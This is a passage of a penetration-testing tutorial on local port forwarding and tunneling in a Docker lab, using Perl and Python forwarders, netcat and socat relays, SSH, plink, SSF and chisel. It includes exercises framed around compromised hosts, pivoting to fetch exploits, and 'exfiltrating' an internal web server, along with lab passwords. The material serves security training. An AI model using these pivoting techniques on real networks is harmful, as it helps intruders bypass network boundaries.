my $local_port = shift;
my ($remote_host, $remote_port) = split &#39;:&#39;, shift();

print &quot;Starting a server on 0.0.0.0:$local_port\n&quot;;
my $server = new_server(&#39;0.0.0.0&#39;, $local_port);
$ioset-&gt;add($server);

while (1) {
    for my $socket ($ioset-&gt;can_read) {
        if ($socket == $server) {
            new_connection($server, $remote_host, $remote_port);
        }
        else {
            next unless exists $socket_map{$socket};
            my $remote = $socket_map{$socket};
            my $buffer;
            my $read = $socket-&gt;sysread($buffer, 4096);
            if ($read) {
                $remote-&gt;syswrite($buffer);
            }
            else {
                close_connection($socket);
            }
        }
    }
}
</code></pre>

The file is already stored at jumphost - however normally you have to create it, for example using `nano` or `vim`.

As an example let the user jumphost be hacked. To emulate this, we make ourselves the user on the system (password is `jumphost`).

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash
su jumphost
</code></pre>

Then lets start the forwarder

<pre><code class="bash">cd ~
perl tcp-proxy2.pl 8080 192.168.2.50:80
Starting a server on 0.0.0.0:8080
</code></pre>

Once port forwarding is started, you can access the internal server from the outside.

<pre><code class="bash">doeti &lt;id_outside&gt;
curl http://192.168.1.5:8080
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

For better grasp we are using an airport example:

<div markdown="0">
<blockquote>
You are sitting at the airport and only HTTP is allowed, so port 80 and 443 is possible to the outside world. 
But you want to access your SSH server. This server is normally publicly reachable in the internet at a given IP. 
The ssh service at the server is listening on port 22. To do so call a friend which has a publicly available server to forward from HTTP to SSH from his server to your SSH server.
</blockquote>
</div>

<div markdown="0">

  <blockquote>
   At the airport only HTTP(S) is allowed, so only port 80 and 443 is accessible to reach outside world. But you want to reach your SSH server which is listening on port 22. You can call a friend who can setup a 
local port forwarding at a publicly available server. What do you do?
   Your client is &lt;id_inside_client&gt;.  Your friends IP is 192.168.2.5 (jumphost). Try to reach the ssh server at 192.168.2.50 with credentials: user: "inside" / password: "inside".
  </blockquote>

  <p>
    <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-bs-toggle="collapse" data-bs-target="#exercise_portforwarding_2" aria-expanded="false" aria-controls="exercise_portforwarding_2">
      See Answer
    </button>
  </p>
  <div class="collapse" id="exercise_portforwarding_2">
  <div class="card card-body">
  <p class="card-text">

First verify at which IPs you are at jump host and then start the forwarder connecting to 192.168.2.50:22. with the corresponding credentials
  <pre><code class="bash">doeti &lt;id_jumphost&gt;
ip a  | grep 192
    inet 192.168.2.5/24 brd 192.168.2.255 scope global eth0
    inet 192.168.1.5/24 brd 192.168.1.255 scope global eth1
perl /home/jumphost/tcp-proxy2.pl 80 192.168.2.50:22
Starting a server on 0.0.0.0:80
</code></pre>

  <pre><code class="bash">doeti &lt;id_inside_client&gt;
ssh -l inside -p 80 192.168.2.5
  </code></pre>

Enter "yes" and "inside" to connect to the ssh server.

Now you can check that you were forwarded using:

<pre><code class="bash">ip a | grep 192
    inet 192.168.2.50/24 brd 192.168.2.255 scope global eth0
</code></pre>

  </p>

  </div>
  </div>

</div>

#### Python

Often also Python is installed and can be used without admin privileges:

The following code was taken from this project:

<a href="https://github.com/vinodpandey/python-port-forward">https://github.com/vinodpandey/python-port-forward</a>

<pre><code class="python"># Author: Mario Scondo (www.Linux-Support.com)
# Date: 2010-01-08
# Script template by Stephen Chappell
#
# This script forwards a number of configured local ports
# to local or remote socket servers.
#
# Configuration:
# Add to the config file port-forward.config lines with
# contents as follows:
#   &lt;local incoming port&gt; &lt;dest hostname&gt; &lt;dest port&gt;
#
# Start the application at command line with &#39;python port-forward.py&#39;
# and stop the application by keying in &lt;ctrl-c&gt;.
#
# Error messages are stored in file &#39;error.log&#39;.
#

import socket
import sys
import thread
import time

def main(setup, error, args):
    # open file for error messages
    sys.stderr = file(error, &#39;a&#39;)

    # if args
    if (len(args) &gt; 0):
        for settings in parse_args(args):
            thread.start_new_thread(server, settings)
    else:
        # read settings for port forwarding
        for settings in parse(setup):
            thread.start_new_thread(server, settings)
    # wait for &lt;ctrl-c&gt;
    while True:
       time.sleep(60)

def parse(setup):
    settings = list()
    for line in file(setup):
        # skip comment line
        if line.startswith(&#39;#&#39;):
            continue

        parts = line.split()
        settings.append((int(parts[0]), parts[1], int(parts[2])))
    return settings

def parse_args(args):
    settings = list()
    for line in args:
        parts = line.split(&quot;:&quot;)
        settings.append((int(parts[0]), parts[1], int(parts[2])))
    return settings

def server(*settings):
    try:
        dock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dock_socket.bind((&#39;&#39;, settings[0]))
        dock_socket.listen(5)
        while True:
            client_socket = dock_socket.accept()[0]
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((settings[1], settings[2]))
            thread.start_new_thread(forward, (client_socket, server_socket))
            thread.start_new_thread(forward, (server_socket, client_socket))
    finally:
        thread.start_new_thread(server, settings)

def forward(source, destination):
    string = &#39; &#39;
    while string:
        string = source.recv(1024)
        if string:
            destination.sendall(string)
        else:
            source.shutdown(socket.SHUT_RD)
            destination.shutdown(socket.SHUT_WR)

if __name__ == &#39;__main__&#39;:
    main(&#39;port-forward.config&#39;, &#39;error.log&#39;, sys.argv[1:])
</code></pre>

In our docker infrastructure it can be started at jumphost to deliver the inside server to the outside world.
We will use the normal user `jumphost` for this (password `jumphost`). Python is already preinstallled at this system and the file
is put in place in the home directory:

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash
su jumphost
cd ~
python2 port-forward.py 8080:192.168.2.50:80
</code></pre>

You can also use a config file instead of the command arguments:

<pre><code class="bash">cat port-forward.config

8080 192.168.2.50 80
</code></pre>

and then just do

<pre><code class="bash">python2 port-forward.py
</code></pre>

After that you can reach the server from the outside system:

<pre><code class="bash">doeti &lt;id_outside&gt;
curl http://192.168.1.5:8080
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

#### netsh

For Windows there is also a possibility to perform local port forwarding at the command line. The tool is called net shell:

To get the traffic from `192.168.2.50:80` to `191.168.1.5:8080` run in the Windows Terminal (`cmd.exe`):

<pre><code class="cmd">netsh portproxy add v4tov4 listenport=8080 listenaddress=192.168.1.5 connectport=80 connectaddress=192.168.2.50 
</code></pre>

The docker infrastructure lacks this example.  

For further information refer to:

<a href="https://smallbusiness.chron.com/forward-port-cmd-52486.html">https://smallbusiness.chron.com/forward-port-cmd-52486.html</a>
<a href="https://www.youtube.com/watch?v=ACjlvzw4bVE">https://www.youtube.com/watch?v=ACjlvzw4bVE</a>

## Local Port Forwarding with a tunnel

For everything shown so far, you must be on the same network to provide access for a server.

To close this gap, we can use tools that build a so-called "tunnel" - something which encapsulate, wraps the forwarding. You can imagine it like if you put a line directly into a network which you then can use. 
Thus, it behaves, as if you were in this network. In this way you access servers that are not in your network.

To put it differently:

<blockquote>Tunneling involves allowing private network communications to be sent across a public network (such as the Internet) through a process called encapsulation. 
</blockquote>
<a href="https://en.wikipedia.org/wiki/Tunneling_protocol">English Wikipedia, 6th July 2022</a>

Or like in <a href="https://goteleport.com/blog/ssh-tunneling-explained/">https://goteleport.com/blog/ssh-tunneling-explained/</a> mentioned in this context:

<blockquote>[...] Tunneling is a method to transport additional data streams within an existing [...] session.
</blockquote>

The tools which can do that enable encryption that is present from the sender to the receiver - a so called "end-to-end-encryption".
What you will later see: For that you have to pick something up at local system and deliver it at your system in one connection. 

In this tutorial you will use four different ones:

- <a href="https://www.openssh.com/manual.html">OpenSSH</a> (all major platforms, originally unixoid)
- <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/docs.html">Putty</a> (Windows) and
- <a href="https://github.com/jpillora/chisel">Chisel (Linux and Windows)</a> or
- <a href="https://securesocketfunneling.github.io/ssf/#home">Secure Socket Funneling, short SSF</a> (Linux and Windows) 

From those all, except SSF, use the SSH network protocol to reach tunneling. SSF uses its own protocol.

### SSH

Let's begin with <a href="https://www.openssh.com/manual.html">OpenSSH</a>. 
It is the tool that originally implemented the SSH protocol.
Because of this history, you can find it today at all major unix systems including <a href="https://superuser.com/questions/104929/how-do-you-run-a-ssh-server-on-mac-os-x">macOS</a>. 
Since <a href="https://devblogs.microsoft.com/commandline/windows10v1803/">Microsoft Windows 10 version 1803</a> you can find it integrated natively at those operating systems.
This ubiquity causes that the word SSH today is used synonymously for the tool and the network protocol. 
This is also how we will do it in this tutorial.

Before we create a tunnel lets just open a shell to the destination network:

Go in the outside client:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
</code></pre>

You can now open a session on the computer in the internal network

<pre><code class="bash">ssh jumphost@192.168.1.5
</code></pre>

Confirm it with "yes" and login using `jumphost`:

<img src="{{ page.image-base | prepend:site.baseurl }}/ssh_session_normal.png" width="100%" alt="standard ssh session">

This will catapult you to the host `192.168.1.5`/`192.168.2.5` with the user `jumphost`. 

Side note: In practice, an SSH server should not be protected with a simple password like this. An SSH server that is open on the Internet immediately receives password attempts from attackers. 
To prevent this, set at least a password sufficiently <a href="https://www.bsi.bund.de/EN/Themen/Verbraucherinnen-und-Verbraucher/Informationen-und-Empfehlungen/Cyber-Sicherheitsempfehlungen/Accountschutz/Sichere-Passwoerter-erstellen/sichere-passwoerter-erstellen_node.html">complex and long password</a>.
Better protect it with <a href="https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server">asymmetric cryptography</a>.

Now inside the jumphost let's use this session to forward the network traffic inside SSH - let's create a "tunnel":

We use SSH to bring the internal network to you on your local machine using Local Port Forwarding:

<pre><code class="bash">ssh -L 4444:&lt;ip+port_you_want_to_get_from_the_destination_network&gt; user@&lt;ip_ssh_destination_network_you_have&gt;
</code></pre>

This is similar to the things we've done so far. But this time we bring the server directly to us (which is the IP `127.0.0.1`) and we do not need a dual homed system.

<pre><code class="bash">ssh -L 4444:&lt;192.168.100.1000:8888&gt; user@&lt;ip_ssh_destination_network_you_have&gt;
</code></pre>

This example would bring the server at `192.168.100.100` Port `8888` from the network you connected with ssh to your local interface at Port `4444`.

If you only want that your forwarded server is reachable at your system you can add localhost 127.0.0.1:

<pre><code class="bash">ssh -L 4444:&lt;192.168.100.100:8888&gt; user@&lt;ip_ssh_destination_network_you_have&gt;
</code></pre>

Now you only can access it at 127.0.0.1:4444. If you want to publish your forwarding to your IP you can use the `-g` switch:

<pre><code class="bash">ssh -g -L 4444:&lt;192.168.100.100:8888&gt; user@&lt;ip_ssh_destination_network_you_have&gt;
</code></pre>

for example if you have the IP 192.168.1.70 and you want to publish the internal server 192.168.100.100 over 192.168.100.150 you can do:

<pre><code class="bash">ssh -g -L 4444:&lt;192.168.100.100:8888&gt; user@192.168.100.150
</code></pre>

then someone who can connect to your 192.168.1.70 can retrieve the system from 192.168.100.100:8888 using 192.168.1.70:4444. 

Be aware that the connection from the ssh ip inside the destination network from your target to 192.168.100.100 is not secured! It is only secured in the tunnel from your system to the ssh ip in the destination network.
Inside the network it is like the raw port forwarding described in [chapter "Local Port Forwarding without tunneling](#local-port-forwarding-without-tunneling).

If you have an ssh server at the target in the external network you can do [multi hopping](#multi-hopping) which secured end-to-end.

If you start the command in this manner you will end up in an ssh session to your destination. To reuse the same console window for other purpose you have on your local machine you can add the parameters '-Nf'.
This runs ssh in the background. -N won't execute any remote commands added at the end what you don't have if you just use ssh for port forwarding. -f requests ssh to go in the background.

<pre><code class="bash">ssh -L 4444:&lt;192.168.100.100:8888&gt; -Nf user@&lt;ip_ssh_destination_network_you_have&gt; 
</code></pre>

In our demo with a newer ssh version you will get 

<pre><code class="bash">bind [::1]:5555: Cannot assign requested address
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/dynamic_port_forwarding_ipv4_error.png" width="100%" alt="Dynamic Port Forwarding IPv4 Error">
SSH tries to <a href="https://www.electricmonk.nl/log/2014/09/24/ssh-port-forwarding-bind-cannot-assign-requested-address/">bind to an IPv6 address</a>, and you have to add 
<code>-4</code>
to force the use of IPv4.

You can check the before mentioned firing up another console window from the outside system:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
</code></pre>

If everything went well you will see the server you want to reach at your computer

<pre><code class="bash">netstat -atln | grep LISTEN
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN

curl http://127.0.0.1:4444
Hi from inside server
</code></pre>

<div markdown="0">
  <blockquote>
  The task now is to get the internal server from our docker infrastructure to you outside.<br>
  <br>
  IP+port of the internal server are: <code>192.168.2.50:80</code><br>
  User and IP of the SSH access you have into the internal network: <code>jumphost@192.168.1.5</code>
  Password: <code>jumphost</code>
  </blockquote>

  <p>
    <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-bs-toggle="collapse" data-bs-target="#exercise_portforwarding_1" aria-expanded="false" aria-controls="exercise_portforwarding_1">
      See Answer
    </button>
  </p>
  <div class="collapse" id="exercise_portforwarding_1">
  <div class="card card-body">
  <p class="card-text">In outside (<code class="bash">doeti &lt;id_outside&gt; bash</code>) do:<br>
  <code class="bash">ssh -L 4444:192.168.2.50:80 jumphost@192.168.1.5</code><br>
  <br>
  Open another console window:<br>
  <code class="bash">doeti &lt;id_outside&gt; bash</code><br>
  Find the port forwarded server at your computer:<br>
  <code class="bash">netstat -atln | grep LISTEN<br>
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN<br>
<br>
curl http://127.0.0.1:4444<br>
Hi from inside server
  </code>
  <br>
  </p>
  </div>
  </div>

</div>

Notice: FTP isn't possible this way because it uses port 21 TCP as control port, but a range of ports for data transmission back. Therefore, if something does not work, it can also be due to the fact that the protocol uses multiple ports. The same is true for TFTP port 69 in UDP forwarding.

#### UDP Forwarding

Services can be TCP or UDP. UDP services are, for example, DHCP, DNS, NTP or SNMP.
These are services that, for example, automatically generate an IP address (DHCP), resolve the name you enter in the browser to an IP (DNS) or manage devices on the network (SNMP).
The port forwarding discussed so far can only forward TCP, which means that all those mentioned services would not be forwardable.

To accomplish this you can forward UDP to TCP on the client side and TCP back to UDP on the server side:

<div id="html" markdown="0" class="mermaid">graph TD
B(TCP)
B --> C(UDP)
C -->|Tunnel| D(UDP)
D --> E(TCP)</div>

For this you can use netcat or socat similar like in [the chapter before](#in-the-company-and-at-the-airport).

We do this in detail with the UDP Protocol SNMP:

Bring the internal server (192.168.1.5 due to Docker Compose Configuration docker-compose.yml) to your outside server:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
</code></pre>

<pre><code class="bash">ssh -4 -L 6666:127.0.0.1:6667 jumphost@192.168.1.5 -Nf
</code></pre>

Now it's listening at port 6667 at your computer. But it's only TCP traffic. 

<img src="{{ page.image-base | prepend:site.baseurl }}/udp_port_forwarding_ssh.png" width="100%" alt="udp port forwarding ssh">

To convert the UDP to TCP and back start the following at jumphost. Here we bring the inside snmp server 192.168.2.50 which has default port 161 to us:

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash
</code></pre>

<pre><code class="bash">socat tcp4-listen:6667,reuseaddr,fork UDP:192.168.2.50:161 &
</code></pre>

And then do this in the outside box:

<pre><code class="bash">socat udp4-listen:161,reuseaddr,fork tcp:127.0.0.1:6666 &
</code></pre>

Now you can reach snmp from the internal server at your host:

<pre><code class="bash">snmpwalk -v1 -c public 127.0.0.1:161
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/ssh_udp_forwarding_snmp.png" width="100%" alt="UDP forwarding SNMP">

Another way is to do it with netcat (it's similar to do it for [tcp](##netcat) except that you now create a forward on both sides, at the client and server side. 
And you look precisely that you transfer it from TCP to UDP and vice verse: 

At jumphost:

<pre><code class="bash">nc -l -p 6667 < /tmp/fifo | nc -u 192.168.2.50 161 > /tmp/fifo
</code></pre>

At your outside box:

<pre><code class="bash">nc -l -u -p 161 &lt; /tmp/fifo | nc 127.0.0.1 6666 &gt; /tmp/fifo
</code></pre>

and 

<pre><code class="bash">snmpwalk -v1 -c public 127.0.0.1:161
</code></pre>

Later on we will see that how we can do UDP forwarding with tools that support this natively.

### plink

<blockquote>
You have broken into a Windows 8 Client inside the company and you have also the credentials for the jump host.
There is no ssh available at this machine, what can you do?
</blockquote>

A software on windows which can do ssh is <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/docs.html">PuTTY</a>.

PuTTY is a graphical user interface capable of doing remote logins. You can use it for rlogin, telnet but especially for SSH.
An SSH alternative for this tool in the windows world is <a href="https://www.putty.org/">Bitvise SSH Client</a> which could be a choice if PuTTY doesn't work for you.

<img src="{{ page.image-base | prepend:site.baseurl }}/putty.png" width="100%" alt="Putty">

You can call PuTTY with parameters from the command line to start a window with an SSH session.
But if you want to have just a command line tool like ssh you can use <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">"Putty Link" or short "plink"</a>.
It is like ssh at the prompt but for Windows.

To run it in our docker setup we utilize <a href="https://www.winehq.org/">wine</a>, which is preinstalled on the outside server.
A tunneled local port forward from `192.168.2.50:80` to `127.0.0.1:4444` over `192.168.1.5` will then look like:

<pre><code class="bash">doeti &lt;id_outside&gt; bash 
wine plink -x -a -T -C -noagent -ssh -l "jumphost" -pw "jumphost" -L 127.0.0.1:4444:192.168.2.50:80 192.168.1.5 -N
</code></pre>

`-x -a -T -C` removes some features and enables compression so that the connection will be faster.
`-noagent` says plink not to try to store your credentials in a PuTTY component called <a href="https://documentation.help/PuTTY/pageant-start.html">Pageant</a>
`-ssh` forces to use ssh instead of other protocols

`-N` will not start a shell which doesn't make a difference in our example, because
wine is running plink. So when you send plink in the background there will be still wine running, and you end up without a prompt.
To quit you have to cancel it with `Ctrl-C`.

Confirm that you trust the server by pressing `y`.
If you are on a windows machine omit `wine`. `wine` is only used to simulate windows in our demo. 

After you started the forwarding you can reach the internal server at your kali box:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
curl 127.0.0.1:4444
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

Since Windows 10's Update April 2018 and Windows Server 2019 ssh is natively available in CMD and also as Powershell Cmdlets.

If you have admin privileges you can even run an ssh server using Powershell:

Open Powershell with admin privileges and check for packages:

<pre><code class="bash">Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
</code></pre>

Take the output and install server

<pre><code class="bash">Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
</code></pre>

then run it:

<pre><code class="bash">Start-Service sshd
</code></pre>

If you cannot connect be sure to check firewall rules, for example if it's inside a bridged vm that windows and your host has a free access to each other.

### SSF

Like mentioned <a href="https://securesocketfunneling.github.io/ssf/">Secure Socket Funneling, or short SSF</a>, is based on another protocol than SSH.
It seems currently not be supported anymore. 
However, SSF features natively support for UDP which SSH only can do with <a href="https://superuser.com/questions/53103/udp-traffic-through-ssh-tunnel">additional effort</a>.
And the authors have designed and implemented it to be more easily <a href="https://securesocketfunneling.github.io/ssf/#developer-corner">extensible</a>.

The tool has the advantage that - similar to the script languages mentioned in the raw port forwarding chapters - you don't have to be an administrator to run it. 

Imagine the following:

<blockquote>
You have hacked into a server on your victim network. This is freely accessible from the Internet, but you have one disadvantage: 
<br>You cannot install any software because you are not an administrator. 
<br>The tool suite of Secure Socket Funneling, SSF for short, offers a remedy here. You copy the zip file to the victim server. Unpack it and start the SSF server on a port that is not blocked.
Now you can all the port forwarding stuff that SSH also can do.
The principles behind SSF are similar to SSH and can be used as an alternative.
</blockquote>

In our infrastructure, the zip file is already unzipped in the home folder. Go to jumphost and check it out:

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash 
su jumphost
cd ~
cd ssf-linux-x86_64-3.0.0
./ssfd -p 80
</code></pre>

This starts the SSF server, which is now listening on port 80.
After that you can use local port forwarding just like with SSH and grab the internal server:

<pre><code class="bash">doeti id_outside bash
cd ssf-linux-x86_64-3.0.0
./ssf -L 4444:192.168.2.50:80 -p 80 192.168.1.5
</code></pre>

In another console window verify:

<pre><code class="ba    sh">doeti &lt;id_outside&gt;
curl http://127.0.0.1:4444
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

#### Secure communication

One thing to note here: SSF works using certificates. In our example we used the preinstalled ones. This means everybody can connect to our jumphost if the default installation is used.
If you want to protect yourself here you can do this:

Put

<pre><code class="bash">[ v3_req_p ]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
</code></pre>

into `extfile.txt` and run

<pre><code class="bash">openssl dhparam -outform PEM -out dh4096.pem 4096
openssl req -x509 -nodes -newkey rsa:4096 -keyout ca.key -out ca.crt -days 3650 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US'
openssl req -newkey rsa:4096 -nodes -keyout private.key -out certificate.csr -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US'
openssl x509 -extfile extfile.txt -extensions v3_req_p -req -sha1 -days 3650 -CA ca.crt -CAkey ca.key -CAcreateserial -in certificate.csr -out certificate.crt
</code></pre>

From the created files move

`dh4096.pem`, `private.key` and `certificate.crt` in the `certs` folder

and

`ca.crt` in `certs/trusted`.

If you do this for client and server you can start the server and the client can connect.
More information about this procedure can be found <a href="https://stackoverflow.com/questions/72733331/setting-up-an-encrypted-connection-for-secure-socket-funneling/72758153">here</a>.

#### UDP Port Forwarding

Unlike SSH, with SSF you don't need an extra translation in TCP for UDP forwarding. It just works with one switch!

<blockquote>In the pentest you notice: 
The corporate network seems to have an interesting SNMP configuration on 192.168.2.50! 
So far you could only crack the SNMP password 'public'. 
You have access to the jump host but privilege escalation has not been possible yet. 
</blockquote>

Start the SSF server on the jump host as a normal user with the flag '-U'.

<pre><code class="bash">doeti &lt;id_outside&gt; su jumphost

cd ~
cd ssf-linux-x86_64-3.0.0
./ssfd -p 8887
</code></pre>

Connect to the server from your Kali box:

<pre><code class="bash">cd ssf-linux-x86_64-3.0.0
./ssf -U 5432:192.168.2.50:161 192.168.1.5 -p 8887</code></pre>

Now you can query the SNMP data with your tools!

<pre><code class="bash">snmpwalk -v1 -c public 127.0.0.1:5432
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/ssf_udp_forwarding_snmp.png" width="100%" alt="ssf udp forwarding snmp">

### Chisel

Another SSH equivalent which can run without admin privileges is <a href="https://github.com/jpillora/chisel">chisel</a>. It is based upon SSH and HTTP. However, you don't need to install any SSH stuff. 
Chisel already brings all this with it.

Chisel has two commands

<pre><code class="bash">chisel server 
</code></pre>

and 

<pre><code class="bash">chisel client
</code></pre>

For each one you can get more information if you run it with `--help` as a parameter, for example: `chisel server --help`.

Start the server and connect the client to it to create a tunnel.

You can extract the compressed file for your distro from <a href="https://i.jpillora.com/chisel!?type=script">https://i.jpillora.com/chisel!?type=script</a>

For example in jumphost run

<pre><code class="bash">su jumphost
cd ~
curl -OL https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
cat chisel_1.7.7_linux_amd64.gz | gzip -d - &gt; chisel
chmod u+x chisel
</code></pre>

This is already done in our examples.

If you want to create it your own on your local system run:

<pre><code class="bash">sudo apt install -y git golang
git clone https://github.com/jpillora/chisel.git
cd chisel
export _GOTMPDIR=$GOTMPDIR
export GOTMPDIR=$(pwd)
go build -ldflags=&quot;-s -w&quot;
export GOTMPDIR=$_GOTMPDIR
unset _GOTMPDIR
</code></pre>

this creates a file `chisel` in the folder `chisel`.
You use `go build -ldflags="-s -w"` to decrease the size of the file a little, <a href="<a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">smaller file chisel</a>">so it's easier to copy</a>.
The environment variable $GOTMPDIR is used because sometimes go fails to compile using `/tmp` as default temp folder.

<blockquote>
You've taken over a computer on the company's network - let's call it A - that can connect to the Internet. You continue to progress your way through the corporate network. 
Eventually, you land on an interesting machine B. You look around, but can't continue because the proper tools are missing. The easiest way would be to download them from the Internet. But this box has no internet connection! 
One solution: Use your already compromised computer A to get access the Internet! <strong>Bring</strong> an outside server to you. <br>
This time not from the internal network, but from the external one. The attentive reader may have noticed at this point that internal or external is a question of perspective here. 
It's simply another network that you don't actually have access to. To put it briefly: You get a server to you from another network. 
</blockquote>

To get the content of <a href="https://example.com">https://example.com</a> to `<id_inside_client>`:

Open 3 terminals:

1 - Compromised machine A connected to the internet:

<pre><code class="bash">doeti &lt;id_jumphost&gt; su jumphost
cd ~
./chisel server -p 8000</code></pre>

2 - Compromised machine B without internet:

<pre><code class="bash">doeti &lt;id_inside_client&gt; su inside_client
cd ~
./chisel client 192.168.1.5:8000 127.0.0.1:9001:example.com:443</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/chisel_client.png" width="100%" alt="Chisel client">

3 - And another terminal to machine B:

<pre><code class="bash">curl -kL https://127.0.0.1:9001 -H &quot;Host: example.com&quot;
&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Example Domain&lt;/title&gt;

    &lt;meta charset=&quot;utf-8&quot; /&gt;
[...]
&lt;body&gt;
&lt;div&gt;
    &lt;h1&gt;Example Domain&lt;/h1&gt;
    &lt;p&gt;This domain is for use in illustrative examples in documents. You may use this
    domain in literature without prior coordination or asking for permission.&lt;/p&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.iana.org/domains/example&quot;&gt;More information...&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code>
</pre>

Depending on how the website behaves, you may not get the page displayed correctly. 
Then it helps to disable certificate checking or set certain headers, especially the `Host` header. 
The Host header specifies the host and port number of the destination of the request. This is done here by the parameters `-k` and `-H`.
`-L` causes `curl` to follow a possible redirect like a browser does.

<div markdown="0">
  <blockquote>
  The task now is to download an exploit from <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> from the compromised machine B in the internal network using <code>chisel</code>.
  Machine B has no internet connection.
  <br>
  <br>
  The constraints:<br>
  Machine A - with internet - is  <code>&lt;jumphost&gt; 192.168.2.5</code><br>
  Connect to it: <code>doeti &lt;id_jumphost&gt; su jumphost</code>, chisel installed at <code>/home/jumphost/chisel</code><br>
  Machine B - without internet - is <code>&lt;inside_client&gt; 192.168.2.110</code><br>
  Connect to it with: <code>doeti &lt;id_inside_client&gt; su inside_client</code>, chisel installation location <code>/home/inside_client/chisel</code><br>
  Both machines compromised computers in the corporate network, where you have access to. You can use <code>docker doeti</code> for that.<br>
  The tool you want to get is from the outside server from http://192.168.1.3:80
  </blockquote>

  <p>
    <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-bs-toggle="collapse" data-bs-target="#exercise_portforwarding_1" aria-expanded="false" aria-controls="exercise_portforwarding_1">
      See Answer
    </button>
  </p>
  <div class="collapse" id="exercise_portforwarding_1">
  <div class="card card-body">
  <p class="card-text">
<br>
Open 3 terminals. The procedure is similar as described before:
<br>
Terminal 1 - machine A:
<br>
<pre><code class="bash">doeti &lt;id_jumphost&gt; su jumphost
cd ~
./chisel server -p 8000</code></pre>
<br>
Terminal 2 - machine B:
<br>
<pre><code class="bash">doeti &lt;id_jumphost&gt; su jumphost
cd ~
./chisel client 192.168.2.5:8000 9001:www.exploit-db.com:443</code></pre>
<br>
<p>
Terminal 3 - machine B. 
Here you then can access <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>:
</p><br>
<pre><code class="bash">curl -kLs https://127.0.0.1:9001 -H "Host: www.exploit-db.com" | grep -C 5  -i -E "title.exploit database"

[...]
    &lt;title&gt;Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers&lt;/title&gt;
[...]
</code></pre>

</p>
  </div>
  </div>

</div>

#### Secure communication

To secure the connection set up credentials with the `--auth` parameter.

For example to exfiltrate the content of the inside web server:

At jumphost:

<pre><code class="bash">doeti &lt;id_jumphost&gt;
su jumphost
cd ~
./chisel server --auth pwnd:l77th4x0r -p 8000
</code></pre>

At the outside client:

First terminal:

<pre><code class="bash">doeti &lt;id_outside&gt;
./chisel client --auth pwnd:l77th4x0r 192.168.1.5:8000 127.0.0.1:9001:192.168.2.50:80
</code></pre>

Second terminal:

<pre><code class="bash">doeti &lt;id_outside&gt;
curl 127.0.0.1:9001
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

#### UDP Port Forwarding

To do UDP forwarding just add a `/udp` at both ends when you call from the client side:

<pre><code class="bash">doeti &lt;id_outside&gt;
./chisel client 192.168.1.5:8000 127.0.0.1:9002/udp:192.168.2.50:161/udp
</code></pre>

## Disadvantages Local Port Forwarding

After we discussed Local Port Forwarding in detail we have to note 2 disadvantages:

First, because the IP and Port where you access is not the same as the real one, certificate validation errors can occur.
This is especially true for HTTPS. 

Second, and this affects the protocol HTTP, redirects won't work if they go to another URL because the forwarding is only valid for exactly a specific web server IP and port.

To close these gaps there is a technique called dynamic port forwarding which we will discuss [later on](#dynamic-port-forwarding).

# Remote Port Forwarding

After the excursion to "local" port forwarding, we will now take a look at the opposite:
<br>
"Remote" port forwarding, also called "reverse" port forwarding.

You remember:

<img src="{{ page.image-base | prepend:site.baseurl }}definition_local_portforwarding.png" width="100%" alt="Definition Local Port Forwarding">

In *Remote Port Forwarding* on the contrary you *send a server somewhere else*.
For this you need an existing tunnel, or in other words: <br>

<img src="{{ page.image-base | prepend:site.baseurl }}/reverse_portforwarding_metapher.jpg" width="30%" style="display:block;margin:auto" alt="Reverse Port Forwarding Metapher">
 
We will look at the following tools: SSH, plink, SSF and Chisel.

Imagine the following:

<blockquote>
You are a pentester. It's very exciting: The exploit worked on the victim. The malware in the attachment of your mail ignited! Now you are on a company computer.
